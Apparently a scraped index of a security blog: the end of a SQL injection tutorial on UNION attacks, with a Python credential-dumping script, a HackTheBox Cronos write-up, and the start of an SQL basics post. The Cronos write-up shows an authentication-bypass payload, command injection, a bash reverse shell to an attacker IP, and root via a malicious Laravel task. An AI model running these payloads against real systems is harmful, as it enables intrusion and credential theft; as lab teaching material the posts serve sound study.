information_schema tables which holds all the \u0026ldquo;metadata\u0026rdquo; or useful information for the database to function properly.\nThe most commonly used tables of information_schema set are:\ninformation_schema.tables - A table containing information about all the tables in the database information_schema.columns - A table containing information about all the columns of all the tables in the database Now that we know that, let\u0026rsquo;s use this information to get information about the tables that are present in our database, \u0026ldquo;freeeze\u0026rdquo;.\nTo do so, we\u0026rsquo;ll essentially send in a query as follows:\n# Complete query in the backend\rSELECT title, author, date, post FROM blogpost WHERE id=11 UNION SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -\r# Our malicious query (post UNION)\rSELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema=database()-- -\rThis will SELECT (print out) all the tables FROM the table called information_schema.tables WHERE those tables are in the current database(). This of course still need to work along with the existing query and we are assuming that we only have one row to print our output on.\nOn the above query I\u0026rsquo;m using a function called GROUP_CONCAT(). This function not only concatenates the entire output, it also places it in a single row. You can use this function wherever there is a LIMIT on the backend and are restricted to print out multiple rows of output.\nIn the form of request it will look like below\nhttp://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c)+FROM+information_schema.tables+WHERE+table_schema=database()--+-\rWith group concat, you can pass in hex characters or even additional ascii to provide your results more distinction and even aesthetics.\nOutput of the above request\nApparently this particular database only has one table, although we can guess that it\u0026rsquo;s not of any use let\u0026rsquo;s take a look at it anyway.\nEnumerating Columns We leverage the use of information_schema.columns table to get all the columns from the table blog we found earlier.\nRequest sent:\nhttp://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7c),5+FROM+information_schema.columns+WHERE+table_name='blog'--+-\rGetting Contents Before printing out everything, let\u0026rsquo;s find out the number of rows present in the table. On the website, it showed only 3 posts, it could be a possibility that there are hidden posts present here.\nLet\u0026rsquo;s take a count of id column as that column has to be present in a table.\nRequest sent:\nhttp://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,4,count(id)+FROM+blog--+-\rUnfortunately there are only 3 posts present and there is no hidden content available here. Regardless of that, let\u0026rsquo;s print those out.\nPrinting out id and it\u0026rsquo;s respective texts out on the screen.\nRequest:\nhttp://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(%27\\r\\n%27,0x7c,id,0x7c,%27\\r\\n%27,text),5+FROM+blog--+-\rThis request will form a query like below:\nSELECT title, author, date, text FROM blog WHERE id=191 UNION SELECT 1,2,3,group_concat('\\r\\n',0x7c,id,0x7c,'\\r\\n',text),5 FROM blog--+-\rUnlike before I used the fourth column to print all the entries out at once because printing it out in any other column would not provide much space to fit all that text.\nExample 2 - Forgot Password In order to avoid breaking the flow of the previous example, I decided to put the second example at the end in which I\u0026rsquo;ll cover testing as well as exploitation.\nUnlike the previous example where it was quite obvious that the parameter was vulnerable and was using GET requests, let\u0026rsquo;s take a look at a forgot password functonality which uses a POST request and has some minor filtering in place.\nBefore moving onto testing a certain functionality it\u0026rsquo;s important to understand that functionality. Let\u0026rsquo;s take a look at how this particular input field can be interacted.\nLanding page:\nBy just sending \u0026ldquo;admin\u0026rdquo;, it prints out an error \u0026ldquo;Incorrect Format\u0026rdquo;. This is good, getting errors is nice. When special SQL characters are sent with just \u0026ldquo;admin\u0026rdquo; leads to the same error.\nBy sending \u0026ldquo;test@test.com\u0026rdquo; a different error is prompted - \u0026ldquo;user not found\u0026rdquo;. Ok, great, we can perform user enumeration.\nNow that the validation requirement is met, let\u0026rsquo;s try sending special SQL characters like the ones stated above to test it out.\nVulnerability Testing I\u0026rsquo;ll be showing the screenshots of BurpSuite Repeater since the data sent in the POST request is not visible on the webpage.\nSingle-quote - ' Appending a single-quote to an email address and sending that to the server By sending a single-quote, we are presented with a new error which clearly states that the query caused an error in the database. A good sign.\nSemi-colon - ; Appending a semi-colon to an email address and sending that to the server By sending a semi-colon, a db error wasn\u0026rsquo;t presented but rather a \u0026ldquo;user not found\u0026rdquo; error. This indicates that even though the query may be getting terminated, it is working just as intended.\nComments - -- - Appending a comment to an email address and sending that to the server By sending a comment, a db error wasn\u0026rsquo;t presented but rather a \u0026ldquo;user not found\u0026rdquo; error. This indicates that even though the rest of the query may be getting terminated, it is working just as intended.\nWe saw that when we used a single-quote we were presented with a database error, probably so because an extra quote was present in the final query that was passed onto the database for execution. What if a single-quote was used and a comment was appended to it?\nWe can say that we have successfully injected single-quote and a comment in the query.\nAND operator When a string is passed onto a query, you always have to end it with a single-quote since you\u0026rsquo;re appending additional SQL parameters. To perform an AND test here, we add a single-quote which the PHP would have done for ourselves since it\u0026rsquo;s a string. Then we add the AND operator and put our conditions in single-quotes to except the last one which we\u0026rsquo;ll let the PHP code add for us.\nAlthough 1=1 is true, the earlier part of the condition is false and so we got the false result, and so this test also printed out the same error.\nOR operator Similar to the previous test, we send a request replacing \u0026ldquo;AND\u0026rdquo; with \u0026ldquo;OR\u0026rdquo; Surprinsingly this printed the same error instead of saying that it found a user. This was surprising because we were able to inject single-quotes into the query.\nSleep We\u0026rsquo;ll append a sleep command along with an operator either AND or OR and wait for those many seconds to get the response back. The request I sent for testing was: email=test%40test.com'+AND+sleep(5);--+-\rUnfortunately the responses were received right away. Sleep test did not turn out as expected.\nSo far we know that we were successfully able to inject a single-quote and a comment. Let\u0026rsquo;s build a little on that to see if we could actually inject and gain something useful out of it.\nNumber Of Columns This process as such comes under the enumeration part of the exploitation of SQL injection, but it can also act as a sure indicator that we actually can perform injections. If we can enumerate number of columns present in this table we can go further.\nUnlike last time, let\u0026rsquo;s use another method to get the number of columns - ORDER BY. In UNION, you are presented with an error till the number of columns in the table and the columns in your SELECT statement are not equal, you combine two tables into one. In ORDER BY, you get an error when the number of columns in your \u0026ldquo;order by\u0026rdquo; clause is more than the number of columns in the table, you sort the output of the entire query as per a column. Just like UNION, ORDER BY can also work on the basis of index of the column and you need not know the column names beforehand.\nEach table that exists, has to have atleast two columns, one is \u0026ldquo;id\u0026rdquo;, another could be anything. This table could potentially have four columns. One has to be \u0026ldquo;id\u0026rdquo;, for login functionality it requires \u0026ldquo;username\u0026rdquo; and \u0026ldquo;password\u0026rdquo;, and for reset it requires \u0026ldquo;email\u0026rdquo;. But let\u0026rsquo;s start from column one anyway.\nRequest sent:\nemail=test%40test.com'+ORDER+BY+1;--+-\rOk, it has one column, let\u0026rsquo;s check if it has more. We\u0026rsquo;ll append a number and then repeat the earlier request till we get some sort of error.\nAs we repeat the process, we encounter an error when we try to sort the output of the table as per column #5. This indicates that we actually do have an injectable parameter which we can proceed with, and also that the table has only four columns to work with.\nVulnerability Exploitation - UNION Attacks Backend Query Since this functionality is taking in email address and checking if the username is found, let\u0026rsquo;s estimate a query that the backend PHP code is using\nSELECT username FROM users WHERE email = 'user_input';\rNumber of Columns Our next step would have been to find the number of columns which we already did earlier (using ORDER BY), finding four columns, but we did not determine which column number is printable, so let\u0026rsquo;s do that.\nTo find a printable column, we\u0026rsquo;ll need to use a UNION clause. We can send the same request as the ORDER BY clause, replacing \u0026ldquo;ORDER BY\u0026rdquo; with \u0026ldquo;UNION SELECT\u0026rdquo;\nRequest sent:\nemail=test%40test.com'+UNION+SELECT+1,2,3,4;--+-\rA high possibility that \u0026ldquo;UNION\u0026rdquo; is blocked, as that is often seen as \u0026ldquo;hacking attempt\u0026rdquo; while usage of \u0026ldquo;SELECT\u0026rdquo; looks benign.\nIn order to bypass that we could try using mixed-case UNION - \u0026ldquo;UnIoN\u0026rdquo;\nRequest sent:\nemail=test%40test.com'+UnIoN+SELECT+1,2,3,4;--+-\rThe error changed, it seems that one of columns from the UNION clause is trying to get printed, but it requires it to be as per the email validation. Let\u0026rsquo;s test which column is of email by sending \u0026ldquo;a@b.com\u0026rdquo; in place of the numbers one at a time.\nSetting first column as an \u0026ldquo;email\u0026rdquo;\nWe\u0026rsquo;ll repeat this, and soon find out that the fourth column is that of email\nNot only did we meet the email requirement of our new SELECT statement, but also found the column which is printable!\nEnumerating Database Printing out information in this would a little tricky as we have to maintain the email format to meet the validation requirement.\nLet\u0026rsquo;s start by printing out the name of the database we are using.\nRequest sent:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT(database(),\u0026quot;@b.com\u0026quot;);--+-\rOutput:\nThe database we are using is \u0026ldquo;supercms\u0026rdquo;.\nAlthough we can read the output, it does not look very accessible as it is appended to the email part of our concatenation. It is doable, but we can do better.\nRequest sent:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT(\u0026quot;\\r\\n\u0026quot;,database(),\u0026quot;\\r\\n\u0026quot;,\u0026quot;@b.com\u0026quot;);--+-\rOutput:\nPrinting all our information out on a new line looks much better.\nLet\u0026rsquo;s take a look at the user we are running as:\nWe are running as \u0026ldquo;supercms@localhost\u0026rdquo;. Not so useful, let\u0026rsquo;s move on.\nEnumerating Tables Let\u0026rsquo;s take a count of the tables that exist in the current database we\u0026rsquo;re using.\nRequest:\ntest@test.com' UnIoN SELECT 1,2,3,CONCAT('\\r\\n',count(table_name),'\\r\\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -\rWe see that we have three tables in this database, let\u0026rsquo;s list them out.\nRequest:\ntest@test.com' UnIoN SELECT 1,2,3,CONCAT('\\r\\n','\\r\\n',group_concat(0x7c,table_name,0x7c,'\\r\\n'),'\\r\\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -\rFrom the output above we can see that we have three tables. Let\u0026rsquo;s see what columns each table has\nEnumerating Columns Let\u0026rsquo;s look at the columns of the first table - groups\nRequest:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n','\\r\\n',group_concat(0x7c,column_name,0x7c,'\\r\\n'),'\\r\\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'groups'--+-\rLet\u0026rsquo;s look at the columns of the second table - license\nRequest:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n','\\r\\n',group_concat(0x7c,column_name,0x7c,'\\r\\n'),'\\r\\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'license'--+-\rLet\u0026rsquo;s look at the columns of the third table - operators\nRequest:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n','\\r\\n',group_concat(0x7c,column_name,0x7c,'\\r\\n'),'\\r\\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'operators'--+-\rOut of all the table we enumerated for columns, the \u0026ldquo;operators\u0026rdquo; table seems to have the most interesting columns - username and password.\nAnother way that you could enumerate for \u0026ldquo;interesting\u0026rdquo; columns without doing table name or column name enumeration is by using wildcards. You could ask the database to return any column that has a keyword in it, like \u0026ldquo;user\u0026rdquo;. A query to do so would look like this:\nSELECT GROUP_CONCAT(column_name,0x3a,table_name,'\\r\\n') FROM information_schema.columns WHERE column_name like %user%;\rIn MySQL, you use \u0026ldquo;%\u0026rdquo; as a wildcard in a query. This would print out any column name which has the term \u0026ldquo;user\u0026rdquo; in it (with anything in front or after the term) and its\u0026rsquo; respective table name. Similar could be done for password - \u0026ldquo;%pass%\u0026rdquo;\nLet\u0026rsquo;s try to get all the columns with term \u0026ldquo;user\u0026rdquo; in our example:\nRequest:\ntest@test.com' UnIoN SELECT 1,2,3,CONCAT('\\r\\n','\\r\\n',group_concat(0x7c,column_name,0x3a,table_name,0x7c,'\\r\\n'),'\\r\\n','@test.com') FROM information_schema.columns WHERE column_name like '%user%'-- -\rOutput:\nSince we used a wildcard, we get the results from any column that has user in it, but it does get things done quicker.\nGetting Content Before we dive into dumping information out, it\u0026rsquo;s always a good idea take a count of things. With that said, let\u0026rsquo;s take a count of id of the operators table before we start dumping everything.\nRequest:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n','\\r\\n',count(id),'\\r\\n','\\r\\n','%40test.com')+FROM+operators--+-\rDumping 202 entries on the screen would not have been good idea, and there would also be a high chance of not every entry getting printed about on the screen.\nLet\u0026rsquo;s fetch one entry on the screen, and we\u0026rsquo;ll use that as the basis of our script which will fetch everything for us.\nRequest:\ntest%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n','\\r\\n',__username_,0x3a,__password_,'\\r\\n','\\r\\n','%40test.com')+FROM+operators+LIMIT+0,1--+-\rOutput:\nA test account in the first row is odd, and although there\u0026rsquo;s a shortcut here, I\u0026rsquo;ll cover that once we develop a script to fetch all the accounts.\nIn the above query I have used \u0026ldquo;LIMIT 0,1\u0026rdquo; to print only 1 row with 0 offset. Offset is the first part, it states which row will it start printing (or SELECTing) from the beginning of the table, the index starts from 0. The second part (\u0026ldquo;1\u0026rdquo;) states how many rows to print (or SELECT) out of the output.\nI\u0026rsquo;ve created a python script that will cycle through all the (202) accounts present here and print out the response on the terminal. This requires additional filtering as it does not print out only the credentials, which is what we care about.\nimport requests\rdef injection(a):\rreturn \u0026quot;test@test.com' UnIoN SELECT 1,2,3,CONCAT('\\r\\n','\\r\\n','cred:',__username_,0x3a,__password_,'\\r\\n','\\r\\n','@test.com') FROM operators LIMIT %s,1-- -\u0026quot; % a\rfor i in range(0,202):\rpayload = {'email':injection(i)}\rr = requests.post('http://10.10.10.31/cmsdata/forgot.php', data=payload)\rprint r.text\rExplanation of the script:\nIn the first time, I imported the requests module of python to perform automated requests In the fourth line, I defined an injection function which only returns an injection payload as per the for loop, and changes the OFFSET of the payload with \u0026ldquo;LIMIT 1\u0026rdquo;. This allows us to cycle through the table and print out only one entry per request. I\u0026rsquo;ve also added a constant string \u0026ldquo;cred:\u0026rdquo; in the injection payload which will print as a prefix to every credential dumped for processing purposes. In the eighth line, a for loop is created to cycle through all the accounts present in the database. In the ninth line, email payload is set to be sent in the POST request In the tenth line, a request is sent to the required host along with necessary data which we defined above. All of that requests data is assigned to a variable to do further processing on it. In the last line we are printing out the response on the terminal To ensure that the script is running in the first place and as expected we first send only one request (keeping range(0,1)), and check the response.\nOutput:\nResponse comes exactly as expected, but it requires processing. We can use grep and cut commands to get the useful output.\nCommand used:\npython sqli_charon.py | grep \u0026quot;cred:\u0026quot; | cut -d\u0026quot;:\u0026quot; -f2,3\rOutput:\nPerfect, let\u0026rsquo;s get them all and save them in a file\nAs shown above, we were able to get all the credentials that was present in the operators table.\nThis is not the only way to automate this process, and I\u0026rsquo;d like to encourage you to come up with different ways to do the same as a fun learning exercise.\nThe shortcut way to do this would again be using wildcards. Since we know that there are test accounts present in this table to waste our time, we could ask the database to get the count of rows which does not have a username with \u0026ldquo;test\u0026rdquo; in it.\nQuery:\nSELECT 1,2,3,CONCAT('\\r\\n',count(id),'\\r\\n','@test.com') FROM operators WHERE __username_ NOT like 'test%'-- -\rRequest:\ntest%40abcd.com'+UnIoN+SELECT+1,2,3,CONCAT('\\r\\n',count(id),'\\r\\n','%40test.com')+FROM+operators+WHERE+__username_+NOT+like+'test%25'--+-\rOut of 202 rows in the table, 200 were fake accounts, and just two useful accounts.\nAs a sidenote, if you\u0026rsquo;d like to crack hashes you got via some SQL injection or some another way, it is a good idea to first try to crack them online. It not only saves you time but also resources.\nhttps://crackstation.net/ https://hashes.org/search.php https://hashes.com/en/decrypt/hash Summary To summarize the post:\nTo start with testing for SQL injection points, it\u0026rsquo;s necessary to sift through the application and make note of all the user input fields and parameters. Each parameter and input field must be tested individually. Send SQL specific characters to cause an error in the query generation that will lead to database causing an error. Look for changes in the webpage of error per parameter/input test Testing checklist:\nName Character Function Single quote ' String terminator Semi colon ; Query terminator Comment -- - Removing rest of the query Single quote with a comment '-- - End a string and remove rest of the query Single quote, semi colon and a comment ';-- - End a string, end query, and remove rest of the query OR operator OR 1=1-- - For integers, true test OR operator OR 1=2-- - For integers, false test OR operator ' OR '1'='1'-- - For strings, test test AND operator AND 1=1-- - For integers, true test AND operator AND 1=2-- - For integers, false test AND operator ' AND '1'='1'-- - For strings, true test Sleep function OR sleep(5)-- - Blind test UNION attack hack steps:\nUse mixed case in case of some filtering Use \u0026ldquo;ORDER BY\u0026rdquo; to get the number of columns Find printable columns Get \u0026ldquo;version()\u0026rdquo; Get count of tables in your \u0026ldquo;database()\u0026rdquo; Get tables in your \u0026ldquo;database()\u0026rdquo; Get count of columns per table Get interesting columns Get count of rows per interesting table Get data Automate queries Fin If you would like to learn more, you can move on to the third post - SQL Injection 0x03 - Blind Boolean Attacks\nIf some part of this post feels unexplained or you did not understand, feel free to contact me :) Have a great day, take care, and hack the planet!\n","permalink":"http://localhost:1313/sqli-0x02/","title":"SQL Injection 0x02 - Testing and UNION Attacks"},{"content":"HackTheBox - Cronos Writeup w/o Metasploit Introduction Cronos is a HackTheBox retired machine. It is a Linux box, and has been officially rated as medium in difficulty, although I feel the machine is quite easy. Let\u0026rsquo;s jump in.\nReconnaissance General Enumeration We\u0026rsquo;ll start out with an nmap scan. I always start with a quick initial scan. Command:\nnmap -Pn -n -oN nmap/initial 10.10.10.13\rOutput: We can see that from the top 1000 ports only three are open:\nport 22 - SSH port 53 - DNS port 80 - HTTP Let\u0026rsquo;s make some notes!\nSince port 22 is open, this is mostly a Linux machine. Port 53 is a rare port to be open, especially on a TCP side of the network, this indicates that we could perform zone transfer against it. Port 80 is HTTP so there is probably some web based system present.\nLet\u0026rsquo;s perform a targeted scan against these ports found. Command:\nnmap -Pn -n -p22,53,80 -sC -sV -oN nmap/targeted 10.10.10.13\rOutput:\nLet\u0026rsquo;s make some more notes! The SSH is OpenSSH 7.2 so I\u0026rsquo;m not going to bother doing anything on that, but we now know that it is potentially Ubuntu Xenial 16.04 LTS machine. We got DNS and HTTP server versions too. From the Apache version, our guess of the OS gets a little more stronger.\nSince the DNS port is open, and we might be dealing with some web-based application, we should enumerate DNS first to get any domain, and subdomain information we can get before starting with HTTP\nDNS Enumeration Since we only have an IP address on hand, let\u0026rsquo;s find try to find some nameservers. We can fetch all the DNS records of a domain with it\u0026rsquo;s corresponding IP address but we do need a domain first, which is what this nameserver enumeration will provide us.\nGreat, we got a nameserver of the corresponding domain! Let\u0026rsquo;s get all the subdomains now\nWe got two subdomains of cronos.htb:\nadmin.cronos.htb www.cronos.htb Web Enumeration Now with enough information on hand, we can start enumerating HTTP\nBefore we start ensure that the subdomains that we found has been added to the /etc/hosts file\nTo ensure all our steps could be retraceable, let\u0026rsquo;s enable BurpSuite and ensure it\u0026rsquo;s logging every request. Interception isn\u0026rsquo;t required, just logging of every request you send to the webserver, and other interactions.\nManually browsing to the cronos.htb reveals that all the links present are external, and nothing interesting in the page source.\nManually browsing to the admin.cronos.htb reveals a login portal, much more interesting.\nThe portal is using PHP The page source doesn\u0026rsquo;t provide any extra information. Since I have an admin login portal on hand, I will first try if common credentials would log me in or not before I start performing automated enumeration, such as running gobuster on both the subdomains consecutively.\nExploitation - Gaining Initial Foothold Authentication Bypass - SQL Injection Upon failed attempts to log into the system with common credentials like \u0026ldquo;admin:admin\u0026rdquo; \u0026ldquo;admin:password\u0026rdquo; \u0026ldquo;admin:password123\u0026rdquo;, I sent the simplest SQL injection payload in the username field, and voilà! We have successfully logged into the portal.\nIf you\u0026rsquo;re wondering why I did that? Or what even made me believe that the SQL injection would work? The answer is quite simple, I don\u0026rsquo;t. The credentials could have been hardcoded, or anything else. The reason why I tried this is because of the sole reason that this is a login portal. Quite often login portal would be using some sort of database system to store users data, and since this portal was using PHP, I decided to give it a try.\nRemote Code Execution Let\u0026rsquo;s check the page source of this page too, before messing around with the custom \u0026ldquo;Net Tool v0.1\u0026rdquo;\nSeems like there\u0026rsquo;s some potential for code injection. Let\u0026rsquo;s test it.\nThere\u0026rsquo;s no protection against stacking commands using ; and we definitely have an RCE on this custom tool, let\u0026rsquo;s do what we do best - exploit it.\nGetting A Shell Using the bash one-liner reverse shell to get a shell. I like to stick to port 443 because the reverse shell will not get killed or dropped by the target systems\u0026rsquo; firewall.\nCommand:\n; /bin/bash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.19/443 0\u0026gt;\u0026amp;1\u0026quot;\rCatching the reverse shell from our listener\nWe can read user.txt as www-data but let\u0026rsquo;s do that later\nPrivilege Escalation I transferred LinEnum.sh to the target machine and executed it, found an interesting cron job\nIf you wanted to find this manually you could do that by this command - cat /etc/cron*\nUpon finding a cron job, it is essential to check when it will run. This is to avoid any rabbit holes, it\u0026rsquo;s great to find a root owned cron job, but no use if it runs monthly or quarterly.\nCredit to nixCraft\nWhen a particular field is marked with an asterisk, it indicates that the cron is run at every unit of that field. In our case, the cron is run every minute of every hour of every day of every month! Perfect.\nNow we could either leverage this by overwriting the cron file, but that is a horrible practice and should never become a habit. Doing such in a real life engagement may lead to dire consequences.\nLet\u0026rsquo;s do it the \u0026ldquo;right\u0026rdquo; way by creating a scheduled task in Laravel using their docs. When working with something new, the documentation of the new technology or application is always a good place to look.\nThe first thing we see in the docs is a very similar cron job, pasted below.\nAs per the docs we should create schedules in /laravel/app/Console/Kernel class.\nNow that we know where to add scheduled tasks, let\u0026rsquo;s see how to add them.\nWe can modify frequency of our scheduled task too, which runs independently to the cron job.\nNow that we have all the information we need, let\u0026rsquo;s exploit this!\nI was unable to edit the file in the target system so I transferred it to my local machine. nc is a good tool to use when transferring a single file or some files from the target system to your attacking machine.\nSuccessfully saved the task scheduling file\nAs per the documentation, a malicious task was scheduled to be executed every minute along with the cron job.\nIt\u0026rsquo;s always a good idea to backup the original file that you\u0026rsquo;ll be manipulating and then performing any actions that you require on it. Backed-up the original Kernel.php file and then transferred the malicious file in it\u0026rsquo;s place.\nOnce the file is in place, we wait for a minute with our listener waiting for the reverse shell, and done. We are root.\nLet\u0026rsquo;s go get our loot!\nAlways a good idea to get the contents of the /etc/shadow file too\nExtra - Beyond r00t - Vulnerability Analysis This section will cover the vulnerability analysis as well as understanding how the code is working.\nAuthentication Bypass - SQL Injection The following code is from the index.php file that was responsible for handling the login requests for the admin.cronos.htb.\n\u0026lt;?php //ini_set('display_errors', 1); //ini_set('display_startup_errors', 1); //error_reporting(E_ALL); include(\u0026quot;config.php\u0026quot;); session_start(); if($_SERVER[\u0026quot;REQUEST_METHOD\u0026quot;] == \u0026quot;POST\u0026quot;) { // username and password sent from form $myusername = $_POST['username'];\r$mypassword = md5($_POST['password']); $sql = \u0026quot;SELECT id FROM users WHERE username = '\u0026quot;.$myusername.\u0026quot;' and password = '\u0026quot;.$mypassword.\u0026quot;'\u0026quot;;\r$result = mysqli_query($db,$sql);\r$row = mysqli_fetch_array($result,MYSQLI_ASSOC);\r//$active = $row['active']; $count = mysqli_num_rows($result); // If result matched $myusername and $mypassword, table row must be 1 row\rif($count == 1) { //session_register(\u0026quot;myusername\u0026quot;); $_SESSION['login_user'] = $myusername;\rheader(\u0026quot;location: welcome.php\u0026quot;);\r}else { $error = \u0026quot;Your Login Name or Password is invalid\u0026quot;;\r} } ?\u0026gt;\rLet\u0026rsquo;s understand what is piece of code is doing line by line\nOn line 5, it includes the database config file config.php On line 8, it checks if the login request has issued as a POST request, only if it is the authentication can proceed\nOn line 11, the \u0026ldquo;username\u0026rdquo; parameter from the POST request is assigned to a PHP variable $myusername On line 12 , an MD5 hash of the \u0026ldquo;password\u0026rdquo; parameter from the POST request is assigned to a PHP variable $mypassword\nIt is important to note that no escaping or validation of the user input has done before assigning them to the PHP variables.\nOn line 14, an SQL statement is created using the above PHP variables. The statement that would be passed on to the database server would be as follows:\nSELECT id FROM users WHERE username = '$myusername' AND password = '$mypassword';\rThe query retrieves the value of the column \u0026ldquo;id\u0026rdquo; from a row where the \u0026ldquo;username\u0026rdquo; and \u0026ldquo;password\u0026rdquo; matches the credentials sent by the end-user. Uses this \u0026ldquo;id\u0026rdquo; value to log the user in.\nOn line 15, a query is performed against the database On line 16, the query results are stored\nOn line 18, we count the numer of rows that have returned from the query On line 22, we check if the number of rows returned are one or not. If yes, we can log into the system as that user.\nOn line 26, if we have successfully logged in, we would be redirected to welcome.php On line 28, an error is presented to the end-user if the number of rows returned are not equal to 1.\nNow let\u0026rsquo;s talk about the vulnerbility here. The SQL query that is built is dynamic, dependent on the username and password parameters of the POST request. Since these parameter\u0026rsquo;s values are taken as-is, trusting the user input, and passed on to the PHP variables which goes on to completing the SQL query which would be executed on the database server, allows the attacker to inject SQL into the existing query.\nOn a normal request the query would like follows (considering the end-user send admin : admin as credentials):\nSELECT id FROM users WHERE username = 'admin' AND password = 'admin';\rBut since there\u0026rsquo;s no escaping and validation of the user input, a malicious actor could send in anything. Let\u0026rsquo;s see what happens to the query with the values ('or'1'='1';-- - : [blank]) we sent as credentials:\nSELECT id FROM users WHERE username = ''or'1'='1';-- -' AND password = '';\rWe append a single-quote to the username field which completes it, then introduce an OR operator to the WHERE condition, with 1=1 check, which would always result true. Next we complete the SQL statement by adding a semi-colon and commenting out the rest of the query as to ensure it does not interfere with our injection.\nThis tells the database server that hey send me id from the users table where either the username is nothing or anything. The password check is completely ignored since it\u0026rsquo;s commented out. This results in the database sending all the entries that are present in the users table to the PHP code.\nBut since there\u0026rsquo;s a row count check this shouldn\u0026rsquo;t have worked since this would have dumped the entire users table. Only reason this would\u0026rsquo;ve worked is that the table only consists of one entry and is that of the admin user. Let\u0026rsquo;s check.\nWe get the database credentials from the config.php file which the index.php loads.\nWe check the users table, and indeed the table only has one entry and that of the admin user which is why our payload worked.\nBut what if table had multiple entries? We could have bypassed that check by sending 'or'1'='1' LIMIT 1;-- - is the username field. The LIMIT parameter tells the database how many rows to send, you can even specify the offset where you want the database to start sending rows from by default it is 0 - \u0026ldquo;LIMIT \u0026lt; offset \u0026gt;, \u0026lt; count \u0026gt;\u0026rdquo; - LIMIT 0,1.\nSending the more correct SQL injection would make the query look like below:\nSELECT id FROM users WHERE username = ''or'1'='1' LIMIT 1;-- -' AND password = '';\rCode Injection - Remote Code Execution Let\u0026rsquo;s take a look at the code below.\n\u0026lt;?php\rinclude('session.php');\rif($_SERVER[\u0026quot;REQUEST_METHOD\u0026quot;] == \u0026quot;POST\u0026quot;) {\r//print_r($_POST);\r$command = $_POST['command'];\r$host = $_POST['host'];\rexec($command.' '.$host, $output, $return);\r//print_r($output);\r}\r?\u0026gt;\rIt would take the command parameter from the POST request which was defined to be either \u0026ldquo;ping\u0026rdquo; or \u0026ldquo;traceroute\u0026rdquo;, then it would take the user input. It would then take the command value supplied and append the user input to the command and execute it.\nSince there are no protection mechanisms, the end user can potentially send in anything even command termination characters like ; and send in anything and the server would execute it. Upon code inspection we now know that the malicious could have intercepted the request and send in any value in the command parameter too, although it is not necessary.\n","permalink":"http://localhost:1313/hackthebox/htb-cronos/","title":"HackTheBox - Cronos Writeup w/o Metasploit"},{"content":"SQL Injection 0x01 Hi, welcome to the first post of the SQL injection series. Before we dive into the \u0026ldquo;injection\u0026rdquo; part of it, let\u0026rsquo;s first understand the basics of what SQL is and the usual structure of a database-driven system.\nStructured Query Language (SQL) SQL is a database querying language which comes in various flavours like MySQL, MS-SQL, PostgreSQL, etc. In this series we\u0026rsquo;ll mainly focus on MySQL\nIt\u0026rsquo;s a tabular database system, like Microsoft Excel simply put, with rows and columns.\nDatabase servers can have multiple databases with different user rights if required and within those custom tables are created to support the systems functionality.\nAn SQL database are usually used to support login forms, blogs, ecommerce websites, etc. It\u0026rsquo;s not restricted to websites and can also be found in mobile applications.\nStructure Of A System Usual structure of a database-driven system. Today n-tiered architecture are used in a dynamic system, 3-tier architecture being the simplest kind.\nA three-tier architectural breakdown: Client (or Presentation) tier (Browser) - Renders HTML + JS Logic tier (Code or Application Server) - PHP, ASPX, etc Data tier (Database Server) - MySQL, MS-SQL, PostgreSQL, Oracle, etc.\nStructure of a system visually:\nClient views the system via a browser which sends requests (usually just the parameters) as per the functionalities presented to the logic tier which sends the complete request (the entire query invisible to the user) to the database server. The database server executes the query successfully, if valid, sends the results (or errors) to the logic tier. The logic tier performs any processing that\u0026rsquo;s put by the developer on the results received and forwards the processed result to the end-user.\nBasics of SQL We don\u0026rsquo;t have to learn SQL for DBMS (DataBase Management System) purposes but we certainly need to understand how queries are built and functionality of different aspects of a query. Having this knowledge we can guess a bit better what the query is from the input and output.\nStructure of a SELECT statement SELECT and FROM are required to form a SELECT query. Rest are optional.\n# Used to retrieve rows from selected columns\rSELECT \u0026lt;column_names/wildcard\u0026gt;\r# Specifies the table to retrieve data from\rFROM \u0026lt;table_name\u0026gt;\r# Specifies the condition or logic as per which rows (data) from columns specified should be retrieved\r[WHERE \u0026lt;condition\u0026gt; \u0026lt;operator\u0026gt; \u0026lt;condition\u0026gt;]\r# Concatenates two SELECT queries. Number of rows fetched by both the queries should be same.\r[UNION \u0026lt;SELECT\u0026gt;]\r# Group or aggregate the results by a column name or position\r[GROUP BY \u0026lt;column number/name\u0026gt;]\r# This is the same as putting a where condition\r[HAVING \u0026lt;condition\u0026gt;]\r# Alter the results by the column name or position\r[ORDER BY \u0026lt;column number/name\u0026gt;]\r# Number of rows to display in the output\r[LIMIT \u0026lt;offset\u0026gt;,\u0026lt;number of rows\u0026gt;]\rExample of a SELECT query:\n# All statements end with a semi-colon -\u0026gt; ;\rSELECT CustomerName FROM customers;\rSQL Operands We\u0026rsquo;ll mostly be only working with OR and sometimes AND operators. Other operators that exist are NOT and XOR, which are not so important to us.\nOR logic table: Condition column - statement1_result OR statement2_result\nCondition Result true OR true True ✔ true OR false True ✔ false OR true True ✔ false OR false False ❌ If either of the statements is true, the result will be true.\nAND logic table: Condition column - statement1_result AND statement2_result\nCondition Result true AND true True ✔ true AND false False ❌ false AND true False ❌ false AND false False ❌ If both of the statements are either true or false, the result will be true.\nUsage of these both will help us ensuring an SQL injection is present.\nJust to give a brief about what the NOT operator is used for, let\u0026rsquo;s take an example of a table consisting of all the people living in some country. You want a list of all the people in that country whose job title is 